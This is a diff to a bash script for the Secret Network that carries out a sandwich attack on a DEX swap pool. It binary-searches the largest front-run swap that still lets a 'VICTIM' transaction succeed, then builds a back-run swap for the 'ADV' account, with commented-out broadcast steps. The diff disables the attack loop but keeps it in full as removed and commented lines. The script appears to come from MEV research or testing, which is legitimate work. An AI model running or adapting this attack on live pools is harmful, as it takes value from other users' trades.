@@ -1,7 +1,10 @@
 #!/bin/bash
 
 set -e
-set -x
+#set -x
+
+SECRETD=./secretd
+USR=secret15vya8x6l5qcf0xw28xwehjxd9stymtvf4sqr6q
 
 #exchange_addr=secret1pak8feexy97myp22pjkxmsp5p8dmlkp4mkfxsl
 CONTRACT_ADDRESS=secret1pak8feexy97myp22pjkxmsp5p8dmlkp4mkfxsl
@@ -25,7 +28,8 @@ set_snip_20_viewing_key() {
 
 query_snip_20_balance() {
   viewing_key=vk
-  echo $PASSPHRASE | $SECRETD q compute query $1 "{\"balance\": {\"key\":\"$viewing_key\",\"address\":\"$2\"}}"
+  eval amount=$($SECRETD q compute query $1 "{\"balance\": {\"key\":\"$viewing_key\",\"address\":\"$2\"}}" | jq .balance.amount)
+  echo $amount
 }
 
 swap_sSCRT_to_SHD() {
@@ -35,7 +39,7 @@ swap_sSCRT_to_SHD() {
 }
 
 query_pool() {
-  eval pool_info=$(echo $PASSPHRASE | $SECRETD q compute query $exchange_addr "\"pair_info\"" | jq .pair_info.$1)
+  eval pool_info=$($SECRETD q compute query $CONTRACT_ADDRESS "\"pair_info\"" | jq .pair_info.$1)
   echo $pool_info
 }
 
@@ -45,15 +49,17 @@ generate_and_sign_swap() {
 }
 
 query_pools() {
-  echo "$SHD_ADDR query_pool amount_0"
-  echo "$sSCRT_ADDR query_pool amount_1"
+  echo "SHD_ADDR $(query_pool amount_0)"
+  echo "sSCRT_ADDR $(query_pool amount_1)"
 }
 
 query_balances() {
-  query_snip_20_balance $SHD_ADDR $VICTIM
-  query_snip_20_balance $sSCRT_ADDR $VICTIM
-  query_snip_20_balance $SHD_ADDR $ADV
-  query_snip_20_balance $sSCRT_ADDR $ADV
+  echo "SHD_ADDR VICTIM $(query_snip_20_balance $SHD_ADDR $VICTIM)"
+  echo "sSCRT_ADDR VICTIM $(query_snip_20_balance $sSCRT_ADDR $VICTIM)"
+  echo "SHD_ADDR ADV $(query_snip_20_balance $SHD_ADDR $ADV)"
+  echo "sSCRT_ADDR ADV $(query_snip_20_balance $sSCRT_ADDR $ADV)"
+#  echo "SHD_ADDR USR $(query_snip_20_balance $SHD_ADDR $USR)"
+#  echo "sSCRT_ADDR USR $(query_snip_20_balance $sSCRT_ADDR $USR)"
 }
 
 set_viewing_keys() {
@@ -63,65 +69,65 @@ set_viewing_keys() {
   set_snip_20_viewing_key $sSCRT_ADDR $ADV
 }
 
-deposit_sSCRT $ADV 1000000uscrt
-deposit_sSCRT $VICTIM 1000000uscrt
+#deposit_sSCRT $ADV 1000000uscrt
+#deposit_sSCRT $VICTIM 1000000uscrt
 
-query_pools
+#query_pools
 query_balances
-
-# make victim tx
-generate_and_sign_swap $sSCRT_ADDR 10 20 $VICTIM victim
-echo "victim tx $sSCRT 10 20"
-echo
-
-cnt=0
-lo=0
-hi=100
-while [ $(expr $hi - $lo) -ne 1 ]; do
-  set_snapshot "${UNIQUE_LABEL}-${cnt}"
-
-  mid=$((($hi + $lo) / 2))
-  echo "lo:$lo hi:$hi mid:$mid"
-
-  generate_and_sign_swap $sSCRT_ADDR $mid 0 $ADV adv
-  echo "adv tx token_a $mid 0"
-
-  simulate_tx adv
-  old_pool_a=$(query_pool amount_1)
-  simulate_tx victim
-  new_pool_a=$(query_pool amount_1)
-  dif_pool_a=$(($new_pool_a - $old_pool_a))
-  echo 'dif' $dif_pool_a
-
-  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
-  cnt=$((cnt + 1))
-  echo "=================================== end of a trial"
-  echo
-done
-
-set_snapshot "${UNIQUE_LABEL}-${cnt}"
-echo "final front-run tx token_a $lo 0"
-old_pool_b=$(query_pool amount_0)
-simulate_tx adv
-new_pool_b=$(query_pool amount_0)
-dif_pool_b=$(($old_pool_b - $new_pool_b))
-generate_and_sign_swap $SHD_ADDR $dif_pool_b 0 $ADV adv_back
-echo "final back-run tx token_b $dif_pool_b 0"
-
-echo
-# broadcast all 3 txs
-set_snapshot "${UNIQUE_LABEL}-final"
-simulate_tx adv
-simulate_tx victim
-simulate_tx adv_back
-
+#
+## make victim tx
+#generate_and_sign_swap $sSCRT_ADDR 10 20 $VICTIM victim
+#echo "victim tx $sSCRT 10 20"
+#echo
+#
+#cnt=0
+#lo=0
+#hi=100
+#while [ $(expr $hi - $lo) -ne 1 ]; do
+#  set_snapshot "${UNIQUE_LABEL}-${cnt}"
+#
+#  mid=$((($hi + $lo) / 2))
+#  echo "lo:$lo hi:$hi mid:$mid"
+#
+#  generate_and_sign_swap $sSCRT_ADDR $mid 0 $ADV adv
+#  echo "adv tx token_a $mid 0"
+#
+#  simulate_tx adv
+#  old_pool_a=$(query_pool amount_1)
+#  simulate_tx victim
+#  new_pool_a=$(query_pool amount_1)
+#  dif_pool_a=$(($new_pool_a - $old_pool_a))
+#  echo 'dif' $dif_pool_a
+#
+#  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
+#  cnt=$((cnt + 1))
+#  echo "=================================== end of a trial"
+#  echo
+#done
+#
+#set_snapshot "${UNIQUE_LABEL}-${cnt}"
+#echo "final front-run tx token_a $lo 0"
+#old_pool_b=$(query_pool amount_0)
+#simulate_tx adv
+#new_pool_b=$(query_pool amount_0)
+#dif_pool_b=$(($old_pool_b - $new_pool_b))
+#generate_and_sign_swap $SHD_ADDR $dif_pool_b 0 $ADV adv_back
+#echo "final back-run tx token_b $dif_pool_b 0"
+#
+#echo
 ## broadcast all 3 txs
-#reset_snapshot
-#broadcast_tx adv
-#broadcast_tx victim
-## send back-run tx
-#execute_tx token_b $dif_pool_b 0 $ADV
-
-query_pools
-query_balances
+#set_snapshot "${UNIQUE_LABEL}-final"
+#simulate_tx adv
+#simulate_tx victim
+#simulate_tx adv_back
+#
+### broadcast all 3 txs
+##reset_snapshot
+##broadcast_tx adv
+##broadcast_tx victim
+### send back-run tx
+##execute_tx token_b $dif_pool_b 0 $ADV
+#
+#query_pools
+#query_balances
 
